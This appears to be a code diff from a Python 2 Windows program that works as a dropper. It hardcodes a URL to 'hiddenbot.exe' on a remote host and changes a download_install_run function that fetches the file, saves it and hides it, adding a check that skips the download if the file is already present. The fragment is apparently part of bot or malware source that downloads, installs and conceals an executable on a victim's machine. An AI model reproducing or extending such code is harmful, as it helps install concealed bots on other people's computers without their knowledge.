@@ -8,9 +8,13 @@ from win32com.shell import shell
 global chatboturl
 CHATBOTURL = "http://192.168.2.4:8080/hiddenbot.exe"
 
-def download_install_run(url, specialpath, fname):
-    #Get a path for the file and unhide it.
+def download_install_run(url, specialpath, fname, duplicate=True):
+    #Get a path for the file
     path = file_in_special_path(specialpath, fname)
+    #If we're not meant to duplicate, return if the file's there
+    if duplicate is False and os.path.isfile(path) is True:
+        return
+    #Unhide the file
     unhide_file(path)
     #Save and hide the file
     u = urllib2.urlopen(url)
